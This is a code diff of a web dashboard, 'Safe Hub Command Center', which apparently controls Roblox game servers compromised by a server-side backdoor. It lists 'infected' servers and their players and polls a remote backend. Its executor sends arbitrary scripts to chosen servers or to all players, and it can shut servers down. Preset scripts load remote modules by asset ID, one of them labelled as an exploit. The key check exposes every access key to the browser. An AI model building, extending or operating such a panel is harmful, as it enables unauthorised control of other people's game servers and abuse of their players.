+      <button class="btn-sm danger" onclick="logout()" style="padding:0.65rem 1.75rem;">Logout &amp; Get New Key</button>
+    </div>
+  </div>
+
+  <!-- ========================================================
+       DASHBOARD
+       ======================================================== -->
+  <div class="dashboard" id="dashboard">
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+
+    <!-- SIDEBAR -->
+    <div class="sidebar" id="sidebar">
+      <div class="sidebar-brand">
+        <h3>Safe<span>Hub</span></h3>
+        <div class="sub">Command Center</div>
+      </div>
+      <div class="nav-section-label">Main</div>
+      <button class="nav-item" onclick="switchPage('commands')" id="nav-commands">
+        <span class="nav-icon">></span> Executor
+      </button>
+
+      <div class="nav-section-label">Monitor</div>
+      <button class="nav-item active" onclick="switchPage('servers')" id="nav-servers">
+        <span class="nav-icon">></span> Servers
+        <span class="count" id="navServerCount">0</span>
+      </button>
+      <button class="nav-item" onclick="switchPage('players')" id="nav-players">
+        <span class="nav-icon">></span> Players
+        <span class="count" id="navPlayerCount">0</span>
+      </button>
+
+
+      <div class="nav-section-label">System</div>
+      <button class="nav-item" onclick="switchPage('settings')" id="nav-settings">
+        <span class="nav-icon">></span> Settings
+      </button>
+
+      <!-- User Card -->
+      <div class="user-info">
+        <div class="user-card" id="sidebarUserCard">
+          <div class="user-avatar" id="sidebarAvatar">?</div>
+          <div>
+            <div class="user-name" id="sidebarUsername">Guest</div>
+            <div class="user-roblox" id="sidebarRoblox">No Roblox linked</div>
+          </div>
+        </div>
         <div class="sidebar-footer">
-            <div>Connection</div>
-            <div style="margin-top:2px; color: #28a745;" id="connectionStatus">● Polling (5s)</div>
-            <div class="key-expiry" id="keyExpiryDisplay">Key expires in: --</div>
+          <div>Connection: <span class="status">Polling (5s)</span></div>
+          <div id="keyExpiryDisplay" style="color:var(--warning);margin-top:0.35rem;font-weight:600;">Key expires in: --</div>
         </div>
+      </div>
     </div>
 
+    <!-- MAIN CONTENT -->
     <div class="main-content">
-        <div class="header">
-            <div class="header-left">
-                <h1 id="pageTitle">Servers</h1>
-                <p id="pageSubtitle">Monitor all infected game servers in the network</p>
-                <div class="last-update" id="lastUpdate">Last updated: —</div>
-            </div>
-            <div class="header-right">
-                <div class="stats-badge">
-                    <div class="stat">
-                        <span>Servers</span>
-                        <span class="number" id="serverCount">0</span>
-                    </div>
-                    <div class="stat">
-                        <span>Online</span>
-                        <span class="number" id="onlineCount">0</span>
-                    </div>
-                    <div class="stat">
-                        <span>Players</span>
-                        <span class="number" id="playerCount">0</span>
-                    </div>
-                </div>
-                <button class="btn btn-primary" onclick="refreshData()">⟳ Refresh</button>
-                <button class="btn btn-danger" onclick="logout()">🚪 Logout</button>
-            </div>
+      <!-- TOP BAR -->
+      <div class="topbar">
+        <div class="topbar-brand">
+          <button class="hamburger" id="menuBtn" onclick="toggleMenu()" aria-label="Toggle menu">
+            <span></span><span></span><span></span>
+          </button>
+          <h2>Safe<span>Hub</span></h2>
+          <span class="badge-top">Command Center</span>
         </div>
+        <div class="topbar-actions">
+          <button class="btn-icon" onclick="refreshData()" title="Refresh">↻</button>
+          <button class="btn-icon" onclick="logout()" title="Logout" style="color:var(--danger);">✕</button>
 
-        <!-- Servers Page -->
+          <div class="menu-dropdown" id="menuDropdown">
+            <button class="menu-item" onclick="switchPage('servers'); toggleMenu();">Games</button>
+            <button class="menu-item" onclick="switchPage('players'); toggleMenu();">Players</button>
+            <button class="menu-item" onclick="switchPage('commands'); toggleMenu();">Executor</button>
+            <button class="menu-item" onclick="switchPage('executor'); toggleMenu();">Commands</button>
+            <button class="menu-item" onclick="switchPage('settings'); toggleMenu();">Settings</button>
+            <div class="menu-divider"></div>
+            <button class="menu-item" onclick="refreshData(); toggleMenu();">Refresh</button>
+            <button class="menu-item danger" onclick="logout();">Logout</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- STATS ROW -->
+      <div class="stats-row">
+        <div class="stats-group">
+          <div class="stat-item">Servers <span class="num" id="serverCount">0</span></div>
+          <div class="stat-item">Online <span class="num" id="onlineCount">0</span></div>
+          <div class="stat-item">Players <span class="num" id="playerCount">0</span></div>
+        </div>
+        <div>
+          <span class="last-update" id="lastUpdate">Updated: --</span>
+        </div>
+      </div>
+
+      <!-- PAGES -->
+      <div class="main-grid">
+        <!-- SERVERS -->
         <div class="page active" id="page-servers">
-            <div class="section-title">
-                <span>Active Servers</span>
-                <span class="count" id="serverCountLabel">0 servers</span>
+          <div class="section-title">
+            <span>Active Servers</span>
+            <span class="count" id="serverCountLabel">0 servers</span>
+          </div>
+          <div class="grid" id="serverGrid">
+            <div class="empty-state">
+              <div class="icon">searching...</div>
+              <h3>No Active Servers</h3>
+              <p>Waiting for Safe Hub servers to connect</p>
             </div>
-            <div class="grid" id="serverGrid">
-                <div class="empty-state">
-                    <div class="icon">📡</div>
-                    <h3>No Active Servers</h3>
-                    <p>Waiting for Safe Hub servers to connect</p>
-                </div>
-            </div>
+          </div>
         </div>
 
-        <!-- Players Page -->
+        <!-- PLAYERS -->
         <div class="page" id="page-players">
-            <div class="section-title">
-                <span>Players Online</span>
-                <span class="count" id="playerCountLabel">0 players</span>
+          <div class="section-title">
+            <span>Players Online</span>
+            <span class="count" id="playerCountLabel">0 players</span>
+          </div>
+          <div class="grid" id="playerGrid">
+            <div class="empty-state">
+              <div class="icon">👥</div>
+              <h3>No Players Online</h3>
+              <p>Players will appear here when they join a server</p>
             </div>
-            <div class="grid" id="playerGrid">
-                <div class="empty-state">
-                    <div class="icon">👤</div>
-                    <h3>No Players Online</h3>
-                    <p>Players will appear here when they join a server</p>
-                </div>
-            </div>
+          </div>
         </div>
 
-        <!-- Commands Page -->
+        <!-- COMMANDS + EXECUTOR -->
         <div class="page" id="page-commands">
-            <div class="commands-panel">
-                <div class="panel-title">⚡ Command Center</div>
-                <div class="panel-subtitle">Execute commands on selected server and player</div>
+          <div class="section-title"><span>Commands & Executor</span></div>
+          <div class="commands-executor-layout">
 
-                <div class="form-group">
-                    <label for="serverSelect">Target Server</label>
-                    <select id="serverSelect">
-                        <option value="">Select a server...</option>
-                    </select>
+                   <!-- EXECUTOR PANEL -->
+            <div class="executor-panel" id="executorPanel" style="width:100%;max-width:100%;margin:0;padding:1.5rem 2rem 2rem 2rem;box-sizing:border-box;">
+              <div class="executor-header">
+                <div>
+                  <div class="executor-title">Executor</div>
+                  <div class="executor-sub">Run scripts here</div>
                 </div>
+              </div>
 
-                <div class="form-group">
-                    <label for="playerSelect">Target Player</label>
-                    <select id="playerSelect">
-                        <option value="">Select a player...</option>
-                        <option value="ALL">👥 ALL PLAYERS</option>
-                    </select>
-                </div>
+              <div class="executor-tab-bar" style="display:flex;gap:0.25rem;width:100%;">
+                <button class="executor-tab active" onclick="switchExecutorTab('custom', this)" style="flex:1;">Executor</button>
+                <button class="executor-tab" onclick="switchExecutorTab('presets', this)" style="flex:1;">Scripts Hub</button>
+              </div>
 
-                <div class="form-group">
-                    <label for="commandInput">Command</label>
-                    <select id="commandInput">
-                        <option value="kick">Kick</option>
-                        <option value="ban">Ban</option>
-                        <option value="tempban">Temporary Ban</option>
-                        <option value="message">Send Message</option>
-                        <option value="warn">Warn</option>
-                        <option value="mute">Mute</option>
-                        <option value="unmute">Unmute</option>
-                        <option value="freeze">Freeze</option>
-                        <option value="unfreeze">Unfreeze</option>
-                        <option value="teleport">Teleport</option>
-                        <option value="respawn">Respawn</option>
-                        <option value="heal">Heal</option>
-                        <option value="kill">Kill</option>
-                        <option value="clearinventory">Clear Inventory</option>
-                        <option value="setrank">Set Rank</option>
-                        <option value="giveroles">Give Roles</option>
-                        <option value="removeroles">Remove Roles</option>
-                    </select>
+              <!-- Custom Script Tab -->
+              <div id="executorCustom" style="width:100%;">
+                <div class="form-group" style="margin-bottom:0.75rem;width:100%;">
+                  <label for="execServerSelect">Target Server</label>
+                  <select id="execServerSelect" style="width:100%;display:block;box-sizing:border-box;"><option value="">Select a server...</option></select>
                 </div>
+                <div class="form-group" style="margin-bottom:0.75rem;width:100%;">
+                  <label for="execPlayerSelect">Player <span style="color:var(--text-dim);font-weight:400;text-transform:none;letter-spacing:0"></span></label>
+                  <select id="execPlayerSelect" style="width:100%;display:block;box-sizing:border-box;">
+                    <option value="">Select a player...</option>
+                    <option value="ALL">ALL PLAYERS</option>
+                  </select>
+                </div>
+                <div class="form-group" style="margin-bottom:0.75rem;width:100%;">
+                  <label>Script</label>
+                  <textarea class="executor-textarea" id="scriptInput" placeholder="-- Enter your script here!" style="width:100%;min-height:150px;resize:vertical;display:block;box-sizing:border-box;"></textarea>
+                </div>
+                <div class="executor-actions" style="display:flex;gap:0.5rem;width:100%;">
+                  <button class="btn-sm danger" onclick="executeScript()" style="flex:2;padding:0.65rem 1rem;">Execute</button>
+                  <button class="btn-sm" onclick="clearScript()" style="flex:1;padding:0.65rem 1rem;">Clear</button>
+                  <button class="btn-sm primary" onclick="copyScript()" style="flex:1;padding:0.65rem 1rem;">Copy</button>
+                </div>
+              </div>
 
-                <div class="form-group" id="extraInputGroup">
-                    <label for="extraInput">Additional Parameters</label>
-                    <input type="text" id="extraInput" placeholder="Duration, message, rank, coordinates...">
+              <!-- Presets Tab -->
+              <div id="executorPresets" style="display:none;width:100%;">
+                <div class="form-group" style="margin-bottom:0.75rem;width:100%;">
+                  <label for="presetServerSelect">Target Server</label>
+                  <select id="presetServerSelect" style="width:100%;display:block;box-sizing:border-box;"><option value="">Select a server...</option></select>
                 </div>
-
-                <div class="form-group">
-                    <label for="reasonInput">Reason</label>
-                    <input type="text" id="reasonInput" placeholder="Reason for action...">
+                <div class="form-group" style="margin-bottom:0.75rem;width:100%;">
+                  <label for="presetPlayerSelect">Target Player</label>
+                  <select id="presetPlayerSelect" style="width:100%;display:block;box-sizing:border-box;">
+                    <option value="">Select a player...</option>
+                    <option value="ALL">ALL PLAYERS</option>
+                  </select>
                 </div>
-
-                <div class="command-buttons">
-                    <button class="btn btn-danger btn-full" onclick="executeCommand()">
-                        ⚡ Execute Command
-                    </button>
-                    <button class="btn btn-warning" onclick="clearSelection()">
-                        Clear Selection
-                    </button>
-                    <button class="btn btn-success" onclick="refreshPlayers()">
-                        Refresh Players
-                    </button>
-                </div>
+                <div class="preset-grid" id="presetGrid" style="width:100%;"></div>
+              </div>
             </div>
+
+          </div>
         </div>
 
-        <div class="footer">
-            <p><span class="safe-hub">Safe Hub</span> &bull; Infected Games Command Center &bull; Updates every 5 seconds</p>
+        <!-- SETTINGS PAGE -->
+        <div class="page" id="page-settings">
+          <div class="section-title"><span>Settings</span><span class="count">Customize</span></div>
+          <div class="settings-grid">
+            <div class="settings-card">
+              <div class="settings-label">🎨 Appearance</div>
+              <div class="form-group">
+                <label>Theme</label>
+                <select id="themeSelect" onchange="updateTheme(this.value)">
+                  <option value="dark">Dark (Default)</option>
+                  <option value="light">Light</option>
+                  <option value="midnight">Midnight Purple</option>
+                  <option value="forest">Forest Green</option>
+                  <option value="ocean">Ocean Blue</option>
+                  <option value="crimson">Crimson Red</option>
+                </select>
+              </div>
+              <div class="form-group">
+                <label>Accent Color</label>
+                <div class="color-picker">
+                  <button class="color-btn active" style="background:#38bdf8" onclick="updateAccentColor('#38bdf8','#2563eb',event)" title="Sky"></button>
+                  <button class="color-btn" style="background:#a855f7" onclick="updateAccentColor('#a855f7','#7c3aed',event)" title="Purple"></button>
+                  <button class="color-btn" style="background:#22c55e" onclick="updateAccentColor('#22c55e','#16a34a',event)" title="Green"></button>
+                  <button class="color-btn" style="background:#f59e0b" onclick="updateAccentColor('#f59e0b','#d97706',event)" title="Amber"></button>
+                  <button class="color-btn" style="background:#f43f5e" onclick="updateAccentColor('#f43f5e','#e11d48',event)" title="Rose"></button>
+                  <button class="color-btn" style="background:#ec4899" onclick="updateAccentColor('#ec4899','#db2777',event)" title="Pink"></button>
+                  <button class="color-btn" style="background:#06b6d4" onclick="updateAccentColor('#06b6d4','#0891b2',event)" title="Cyan"></button>
+                  <button class="color-btn" style="background:#f97316" onclick="updateAccentColor('#f97316','#ea580c',event)" title="Orange"></button>
+                </div>
+              </div>
+              <div class="form-group">
+                <label>Background Effect</label>
+                <select id="bgSelect" onchange="updateBackground(this.value)">
+                  <option value="ambient">Ambient Glow (Animated)</option>
+                  <option value="minimal">Minimal Static</option>
+                  <option value="none">None</option>
+                </select>
+              </div>
+            </div>
+
+            <div class="settings-card">
+              <div class="settings-label">🖥️ Interface</div>
+              <div class="form-group">
+                <label>Dashboard Width</label>
+                <select id="widthSelect" onchange="updateWidth(this.value)">
+                  <option value="default">Default (1600px)</option>
+                  <option value="wide">Ultra Wide (1920px)</option>
+                  <option value="compact">Compact (1200px)</option>
+                </select>
+              </div>
+              <div class="form-group">
+                <label>Card Density</label>
+                <select id="densitySelect" onchange="updateDensity(this.value)">
+                  <option value="comfortable">Comfortable</option>
+                  <option value="compact">Compact</option>
+                </select>
+              </div>
+              <div class="form-group">
+                <label class="toggle-label">
+                  <span>Glassmorphism Effects</span>
+                  <input type="checkbox" id="glassToggle" checked onchange="updateGlass(this.checked)">
+                  <span class="toggle-slider"></span>
+                </label>
+              </div>
+              <div class="form-group">
+                <label class="toggle-label">
+                  <span>Smooth Animations</span>
+                  <input type="checkbox" id="animToggle" checked onchange="updateAnimations(this.checked)">
+                  <span class="toggle-slider"></span>
+                </label>
+              </div>
+            </div>
+
+            <div class="settings-card danger-zone">
+              <div class="settings-label" style="color:var(--danger)">⚠️</div>
+              <p style="color:var(--text-secondary);font-size:0.85rem;margin-bottom:1rem;">Reset all local preferences and cached data.</p>
+              <button class="btn-sm danger btn-full" onclick="if(confirm('Reset all settings?')){localStorage.removeItem('safehub_settings');location.reload();}">Reset All Settings</button>
+            </div>
+          </div>
         </div>
+      </div>
+
+      <div class="footer-bar">
+        <span>Safe Hub</span> &bull; best serverside
+      </div>
     </div>
+  </div>
 
-    <script>
-        let serverData = { servers: [] };
-        let selectedServerId = null;
-        let selectedPlayer = null;
-        let currentPage = 'servers';
-        let keyExpiryTime = null;
+  <script>
+    // ==================================================
+    // CONFIGURATION
+    // ==================================================
+    const API_URL = 'https://safehub-backend-production.up.railway.app';
+    const KEY_EXPIRY_HOURS = 24;
+    const MAINTENANCE_MODE = false;
 
-        const API_URL = 'https://safehub-backend-production.up.railway.app';
-        const KEY_EXPIRY_HOURS = 24;
+    // ==================================================
+    // SCRIPT PRESETS
+    // ==================================================
+    const SCRIPT_PRESETS = [
+      {
+        name: 'Aureus V1',
+        desc: 'CrackedByIncreaseron executor script',
+        tag: 'red',
+        tagText: 'EXPLOIT',
+        script: 'require(6036737823).CrackedByIncreaseron("username")'
+      },
+      {
+        name: 'Patrick Destroyer',
+        desc: 'Patrick from SpongeBob scare script',
+        tag: 'orange',
+        tagText: 'FUN',
+        script: 'require(5115793531).scare("username")'
+      },
+      {
+        name: 'F3X Tools',
+        desc: 'F3X building tool executor',
+        tag: 'blue',
+        tagText: 'BUILD',
+        script: 'require(4869378421).F3X("username")'
+      },
+      {
+        name: 'Happy Hub (Sentinel)',
+        desc: 'SentinelPrime from Happy Hub',
+        tag: 'green',
+        tagText: 'HUB',
+        script: 'require(109690586705177).SentinelPrime("username")'
+      }
+    ];
 
-        // ==================== KEY MANAGEMENT ====================
-        function getKeyExpiry() {
-            const stored = localStorage.getItem('safehub_key_expiry');
-            if (stored) {
-                return new Date(stored);
-            }
-            // If no expiry stored, set it to 24 hours from now
-            const expiry = new Date();
-            expiry.setHours(expiry.getHours() + KEY_EXPIRY_HOURS);
-            localStorage.setItem('safehub_key_expiry', expiry.toISOString());
-            return expiry;
+    // ==================================================
+    // STATE
+    // ==================================================
+    let serverData = { servers: [] };
+    let selectedServerId = null;
+    let selectedPlayer = null;
+    let currentPage = 'servers';
+    let validated = false;
+    let linkedRobloxUser = '';
+    let currentAccent = { primary: '#38bdf8', secondary: '#2563eb' };
+
+    const $ = (id) => document.getElementById(id);
+
+    // ==================================================
+    // LANDING + AUTH
+    // ==================================================
+    function openAuth(type) {
+      $('authOverlay').classList.add('active');
+      switchAuth(type);
+    }
+
+    function closeAuth() {
+      $('authOverlay').classList.remove('active');
+    }
+
+    function switchAuth(type) {
+      $('authLogin').style.display = type === 'login' ? 'block' : 'none';
+      $('authRegister').style.display = type === 'register' ? 'block' : 'none';
+    }
+
+    function linkRoblox() {
+      const username = $('robloxUsernameInput').value.trim();
+      if (!username) return;
+      linkedRobloxUser = username;
+      localStorage.setItem('safehub_roblox', username);
+      $('robloxAvatarName').textContent = username;
+      $('robloxPreview').style.display = 'flex';
+    }
+
+    function updateUserCard() {
+      const roblox = linkedRobloxUser || localStorage.getItem('safehub_roblox') || '';
+      const key = localStorage.getItem('safehub_key') || '';
+      const initial = roblox ? roblox[0].toUpperCase() : key ? key[0].toUpperCase() : '?';
+      $('sidebarAvatar').textContent = initial;
+      $('sidebarUsername').textContent = roblox || (key ? key.slice(0, 8) + '...' : 'Guest');
+      $('sidebarRoblox').textContent = roblox ? `@${roblox}` : 'No Roblox linked';
+      if (roblox) linkedRobloxUser = roblox;
+    }
+
+    // ==================================================
+    // KEY VALIDATION
+    // ==================================================
+    async function validateKey() {
+      const keyInput = $('keyInput');
+      const loginBtn = $('loginBtn');
+      const statusEl = $('loginStatus');
+      const key = keyInput.value.trim();
+
+      statusEl.className = 'status-msg';
+
+      if (MAINTENANCE_MODE === true) {
+        statusEl.textContent = 'Please try again later, the website is under construction. Contact dime for info.';
+        statusEl.className = 'status-msg construction';
+        return;
+      }
+
+      if (!key) {
+        statusEl.textContent = 'Please enter your access key.';
+        statusEl.className = 'status-msg error';
+        return;
+      }
+
+      loginBtn.disabled = true;
+      loginBtn.textContent = 'Validating...';
+
+      try {
+        const response = await fetch(`${API_URL}/api/keys`);
+        if (!response.ok) throw new Error(`Server responded with status: ${response.status}`);
+
+        const data = await response.json();
+        const keys = data.keys || [];
+        const foundKey = keys.find(k => k.key === key);
+
+        if (foundKey) {
+          const expiry = new Date(foundKey.expires_at);
+          const now = new Date();
+
+          if (!foundKey.active) {
+            statusEl.textContent = 'Key has been revoked.';
+            statusEl.className = 'status-msg error';
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'Access Dashboard';
+            return;
+          }
+
+          if (expiry < now) {
+            statusEl.textContent = 'Key has expired. Please generate a new one.';
+            statusEl.className = 'status-msg error';
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'Access Dashboard';
+            return;
+          }
+
+          statusEl.textContent = 'Key validated successfully! Loading dashboard...';
+          statusEl.className = 'status-msg success';
+          validated = true;
+
+          const robloxInput = $('robloxUsernameInput').value.trim();
+          if (robloxInput) {
+            linkedRobloxUser = robloxInput;
+            localStorage.setItem('safehub_roblox', robloxInput);
+          }
+
+          localStorage.setItem('safehub_key', key);
+          localStorage.setItem('safehub_validated', 'true');
+          const keyExpiry = new Date();
+          keyExpiry.setHours(keyExpiry.getHours() + KEY_EXPIRY_HOURS);
+          localStorage.setItem('safehub_key_expiry', keyExpiry.toISOString());
+
+          setTimeout(() => {
+            $('authOverlay').classList.remove('active');
+            $('landingPage').style.display = 'none';
+            $('dashboard').classList.add('active');
+            initializeDashboard();
+          }, 800);
+        } else {
+          statusEl.textContent = "Key doesn't exist";
+          statusEl.className = 'status-msg error';
+          loginBtn.disabled = false;
+          loginBtn.textContent = 'Access Dashboard';
         }
+      } catch (error) {
+        console.error('Validation error:', error);
+        statusEl.textContent = 'Network error: ' + error.message;
+        statusEl.className = 'status-msg error';
+        loginBtn.disabled = false;
+        loginBtn.textContent = 'Access Dashboard';
+      }
+    }
 
-        function checkKeyExpiry() {
-            const expiry = getKeyExpiry();
-            const now = new Date();
-            
-            if (now > expiry) {
-                document.getElementById('keyExpiryModal').classList.add('active');
-                return false;
-            }
-            
-            // Update display
-            const diff = expiry - now;
-            const hours = Math.floor(diff / (1000 * 60 * 60));
-            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-            document.getElementById('keyExpiryDisplay').textContent = `Key expires in: ${hours}h ${minutes}m`;
-            
-            // Check every minute
-            setTimeout(checkKeyExpiry, 60000);
-            return true;
+    $('keyInput').addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') validateKey();
+    });
+
+    // ==================================================
+    // KEY EXPIRY
+    // ==================================================
+    function getKeyExpiry() {
+      const stored = localStorage.getItem('safehub_key_expiry');
+      if (stored) return new Date(stored);
+      const expiry = new Date();
+      expiry.setHours(expiry.getHours() + KEY_EXPIRY_HOURS);
+      localStorage.setItem('safehub_key_expiry', expiry.toISOString());
+      return expiry;
+    }
+
+    function checkKeyExpiry() {
+      const expiry = getKeyExpiry();
+      const now = new Date();
+      if (now > expiry) {
+        $('keyExpiryModal').classList.add('active');
+        return false;
+      }
+      const diff = expiry - now;
+      const hours = Math.floor(diff / (1000 * 60 * 60));
+      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+      $('keyExpiryDisplay').textContent = `Key expires in: ${hours}h ${minutes}m`;
+      setTimeout(checkKeyExpiry, 60000);
+      return true;
+    }
+
+    function logout() {
+      localStorage.removeItem('safehub_key');
+      localStorage.removeItem('safehub_validated');
+      localStorage.removeItem('safehub_key_expiry');
+      window.location.reload();
+    }
+
+    // ==================================================
+    // MENU + SIDEBAR
+    // ==================================================
+    function toggleMenu() {
+      const menu = $('menuDropdown');
+      const btn = $('menuBtn');
+      menu.classList.toggle('open');
+      btn.classList.toggle('active');
+    }
+
+    document.addEventListener('click', (e) => {
+      const menu = $('menuDropdown');
+      const btn = $('menuBtn');
+      if (menu && btn && !menu.contains(e.target) && !btn.contains(e.target)) {
+        menu.classList.remove('open');
+        btn.classList.remove('active');
+      }
+    });
+
+    function toggleSidebar() {
+      $('sidebar').classList.toggle('open');
+      $('sidebarOverlay').classList.toggle('open');
+    }
+
+    document.querySelectorAll('.nav-item').forEach(item => {
+      item.addEventListener('click', () => {
+        if (window.innerWidth < 768) {
+          $('sidebar').classList.remove('open');
+          $('sidebarOverlay').classList.remove('open');
         }
+      });
+    });
 
-        function logout() {
-            localStorage.removeItem('safehub_key');
-            localStorage.removeItem('safehub_validated');
-            localStorage.removeItem('safehub_key_expiry');
-            window.location.reload();
+    // ==================================================
+    // FETCH SERVERS
+    // ==================================================
+    async function fetchServers() {
+      try {
+        const response = await fetch(`${API_URL}/api/servers`);
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const data = await response.json();
+        serverData = data.servers ? data : { servers: Array.isArray(data) ? data : [] };
+        renderServers(serverData.servers);
+        renderPlayers(serverData.servers);
+        updateServerSelect(serverData.servers);
+        updateStats(serverData.servers);
+        $('lastUpdate').textContent = `Updated: ${new Date().toLocaleTimeString()}`;
+      } catch (error) {
+        console.error('Fetch error:', error);
+        $('serverGrid').innerHTML = `<div class="empty-state"><div class="icon">⚠️</div><h3>Connection Error</h3><p>Cannot reach backend at ${API_URL}</p></div>`;
+      }
+    }
+
+    // ==================================================
+    // RENDER FUNCTIONS
+    // ==================================================
+    function renderServers(servers) {
+      const grid = $('serverGrid');
+      grid.innerHTML = '';
+      if (!servers || servers.length === 0) {
+        grid.innerHTML = `<div class="empty-state"><div class="icon">📡</div><h3>No Active Servers</h3><p>Waiting for Safe Hub servers to connect</p></div>`;
+        $('serverCountLabel').textContent = '0 servers';
+        $('navServerCount').textContent = '0';
+        return;
+      }
+      $('serverCountLabel').textContent = `${servers.length} servers`;
+      $('navServerCount').textContent = servers.length;
+      servers.forEach(server => {
+        const statusClass = server.isShuttingDown ? 'shutting-down' : server.online ? 'online' : 'offline';
+        const statusText = server.isShuttingDown ? 'Shutting Down' : server.online ? 'Online' : 'Offline';
+        const card = document.createElement('div');
+        card.className = `server-card ${statusClass}`;
+        card.dataset.serverId = server.serverId;
+        const playerList = server.playerNames?.length
+          ? server.playerNames.map(name => `<span class="player-tag" onclick="selectPlayerFromCard('${escapeHtml(name)}', '${server.serverId}')">${escapeHtml(name)}</span>`).join('')
+          : '<span style="color:var(--text-dim);font-size:0.75rem;">No players online</span>';
+        const gamePageUrl = server.gamePageUrl || `https://www.roblox.com/games/${server.serverId || ''}`;
+        card.innerHTML = `
+          <div class="card-header">
+            <div>
+              <div class="game-name">${escapeHtml(server.gameName || 'Unknown Game')}<span class="tag">Infected</span></div>
+              <div class="server-name">${escapeHtml(server.serverName || 'Unnamed Server')}</div>
+            </div>
+            <div><span class="status-badge ${statusClass}"><span class="status-dot ${statusClass}"></span>${statusText}</span></div>
+          </div>
+          <div class="details-grid">
+            <div class="detail-item"><div class="label">Players</div><div class="value">${server.players || 0} <span class="sub">/ ${server.maxPlayers || 50}</span></div></div>
+            <div class="detail-item"><div class="label">Region</div><div class="value">${escapeHtml(server.region || 'Unknown')}</div></div>
+            <div class="detail-item"><div class="label">Ping</div><div class="value">${server.ping || 0}ms</div></div>
+            <div class="detail-item"><div class="label">Map</div><div class="value">${escapeHtml(server.map || 'Unknown')}</div></div>
+            <div class="detail-item"><div class="label">Uptime</div><div class="value">${server.uptime || '0s'}</div></div>
+            <div class="detail-item"><div class="label">Server ID</div><div class="value" style="font-size:0.7rem;color:var(--text-dim);">${escapeHtml(String(server.serverId || '').slice(0, 12))}</div></div>
+          </div>
+          <div class="player-list"><div class="title">Players Online</div><div class="player-tags">${playerList}</div></div>
+          <div class="card-actions">
+            <button class="btn-sm success" onclick="selectServer('${server.serverId}')">Select</button>
+            <button class="btn-sm primary" onclick="window.open('${gamePageUrl}', '_blank')">Game</button>
+            <button class="btn-sm" onclick="joinServer('${server.serverId}')">Join</button>
+            <button class="btn-sm danger" onclick="shutdownServer('${server.serverId}')">Shutdown</button>
+          </div>`;
+        grid.appendChild(card);
+      });
+    }
+
+    function renderPlayers(servers) {
+      const grid = $('playerGrid');
+      grid.innerHTML = '';
+      const allPlayers = [];
+      servers.forEach(server => {
+        if (server.playerNames?.length) {
+          server.playerNames.forEach(name => allPlayers.push({ name, server: server.gameName || 'Unknown', serverId: server.serverId }));
         }
+      });
+      if (allPlayers.length === 0) {
+        grid.innerHTML = `<div class="empty-state"><div class="icon">👥</div><h3>No Players Online</h3><p>Players will appear here when they join a server</p></div>`;
+        $('playerCountLabel').textContent = '0 players';
+        $('navPlayerCount').textContent = '0';
+        return;
+      }
+      $('playerCountLabel').textContent = `${allPlayers.length} players`;
+      $('navPlayerCount').textContent = allPlayers.length;
+      allPlayers.forEach(player => {
+        const card = document.createElement('div');
+        card.className = 'server-card online';
+        card.innerHTML = `
+          <div class="card-header">
+            <div><div class="game-name">${escapeHtml(player.name)}</div><div class="server-name">${escapeHtml(player.server)}</div></div>
+            <div><span class="status-badge online"><span class="status-dot online"></span>Online</span></div>
+          </div>
+          <div class="card-actions">
+            <button class="btn-sm success" onclick="selectPlayerFromCard('${escapeHtml(player.name)}', '${player.serverId}')">Select Player</button>
+            <button class="btn-sm primary" onclick="selectServer('${player.serverId}')">View Server</button>
+          </div>`;
+        grid.appendChild(card);
+      });
+    }
 
-        // ==================== FETCH SERVERS ====================
-        async function fetchServers() {
-            try {
-                console.log('[Safe Hub] Fetching servers...');
-                const response = await fetch(`${API_URL}/api/servers`);
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                
-                const data = await response.json();
-                console.log('[Safe Hub] Server data received:', data);
-                
-                if (data.servers) {
-                    serverData = data;
-                } else if (Array.isArray(data)) {
-                    serverData = { servers: data };
-                } else {
-                    serverData = { servers: [] };
-                }
-                
-                renderServers(serverData.servers);
-                renderPlayers(serverData.servers);
-                updateServerSelect(serverData.servers);
-                updateStats(serverData.servers);
-                document.getElementById('lastUpdate').textContent = `Last updated: ${new Date().toLocaleTimeString()}`;
-            } catch (error) {
-                console.error('[Safe Hub] Error fetching servers:', error);
-                document.getElementById('serverGrid').innerHTML = `
-                    <div class="empty-state">
-                        <div class="icon">❌</div>
-                        <h3>Error Loading Servers</h3>
-                        <p>${error.message}</p>
-                        <p style="margin-top:10px;font-size:12px;">Make sure the backend is running at ${API_URL}</p>
-                    </div>
-                `;
-            }
-        }
+    function updateStats(servers) {
+      let totalPlayers = 0, onlineServers = 0;
+      servers.forEach(s => { if (s.online && !s.isShuttingDown) { onlineServers++; totalPlayers += s.players || 0; } });
+      $('serverCount').textContent = servers.length;
+      $('onlineCount').textContent = onlineServers;
+      $('playerCount').textContent = totalPlayers;
+    }
 
-        // ==================== RENDER FUNCTIONS ====================
-        function renderServers(servers) {
-            const grid = document.getElementById('serverGrid');
-            grid.innerHTML = '';
-            
-            if (!servers || servers.length === 0) {
-                grid.innerHTML = `
-                    <div class="empty-state">
-                        <div class="icon">📡</div>
-                        <h3>No Active Servers</h3>
-                        <p>Waiting for Safe Hub servers to connect</p>
-                    </div>
-                `;
-                document.getElementById('serverCountLabel').textContent = '0 servers';
-                document.getElementById('navServerCount').textContent = '0';
-                return;
-            }
-
-            document.getElementById('serverCountLabel').textContent = `${servers.length} servers`;
-            document.getElementById('navServerCount').textContent = servers.length;
-
-            servers.forEach(server => {
-                const card = document.createElement('div');
-                
-                let statusClass = 'online';
-                let statusText = 'Online';
-                let statusDot = 'online';
-                
-                if (server.isShuttingDown) {
-                    statusClass = 'shutting-down';
-                    statusText = 'Shutting Down';
-                    statusDot = 'shutting-down';
-                } else if (!server.online) {
-                    statusClass = 'offline';
-                    statusText = 'Offline';
-                    statusDot = 'offline';
-                }
-                
-                card.className = `server-card ${statusClass}`;
-                card.dataset.serverId = server.serverId;
-
-                const playerList = server.playerNames && server.playerNames.length > 0 
-                    ? server.playerNames.map(name => 
-                        `<span class="player-tag" onclick="selectPlayerFromCard('${escapeHtml(name)}', '${server.serverId}')">${escapeHtml(name)}</span>`
-                      ).join('')
-                    : '<span style="color:#5a6a7a;font-size:11px;">No players online</span>';
-
